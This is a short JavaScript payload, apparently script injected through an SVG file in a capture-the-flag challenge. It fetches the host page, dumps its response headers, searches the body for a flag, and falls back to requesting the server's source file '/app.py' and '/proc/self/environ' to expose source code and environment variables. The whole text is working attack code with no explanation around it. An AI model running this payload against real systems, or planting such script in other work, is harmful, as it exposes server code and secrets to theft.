svg.script:
// First try to get the flag from the server's response
fetch('/')
  .then(response => {
    // Log all headers
    let headers = '';
    for (let pair of response.headers.entries()) {
      headers += `${pair[0]}: ${pair[1]}\n`;
    }
    document.getElementById('flagText').textContent = `Headers:\n${headers}`;

    // Try to get the flag from the response
    return response.text();
  })
  .then(text => {
    // Check if the flag is in the response
    if (text.includes('flag{') || text.includes('FLAG{')) {
      document.getElementById('flagText').textContent = `Found flag in response:\n${text}`;
    } else {
      // Try to access the flag through the server's source
      fetch('/app.py')
        .then(r => r.text())
        .then(code => {
          document.getElementById('flagText').textContent = `Server code:\n${code}`;
        })
        .catch(() => {
          // If that fails, try to read environment variables
          fetch('/proc/self/environ')
            .then(r => r.text())
            .then(env => {
              document.getElementById('flagText').textContent = `Environment:\n${env}`;
            })
            .catch(() => {
              document.getElementById('flagText').textContent = 'Could not find flag in common locations';
            });
        });
    }
  })
  .catch(error => {
    document.getElementById('flagText').textContent = `Error: ${error}`;
  });
